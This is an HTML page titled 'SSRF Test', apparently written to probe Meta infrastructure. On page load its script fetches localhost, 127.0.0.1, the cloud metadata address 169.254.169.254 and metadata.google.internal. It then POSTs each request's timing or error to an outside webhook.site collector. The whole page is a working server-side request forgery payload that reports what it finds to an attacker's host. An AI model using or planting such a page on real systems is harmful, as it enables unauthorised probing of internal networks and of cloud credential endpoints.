<!DOCTYPE html>
<html>
<body>
    <h2>SSRF Test</h2>
    <script>
        // Intentamos apuntar a un dominio interno de Meta (ej. localhost o IP interna)
        // usando HTTPS para evitar el bloqueo de "Mixed Content"
        const internalTargets = [
            "https://localhost/",
            "https://127.0.0.1/",
            "https://169.254.169.254/", // Metadatos de nube
            "https://metadata.google.internal/"
        ];

        internalTargets.forEach(url => {
            // Enviamos la petición con un timeout para medir el tiempo de respuesta
            const start = performance.now();
            fetch(url, { mode: 'no-cors' })
                .then(() => {
                    const duration = performance.now() - start;
                    // Si la petición tarda más de X segundos, puede que haya conectado
                    fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?ssrf_https=true", {
                        method: "POST",
                        mode: "no-cors",
                        body: `Petición a ${url} completada en ${duration.toFixed(2)}ms`
                    });
                })
                .catch((e) => {
                    fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?ssrf_https_fail=true", {
                        method: "POST",
                        mode: "no-cors",
                        body: `Petición a ${url} falló: ${e.message}`
                    });
                });
        });
    </script>
</body>
</html>
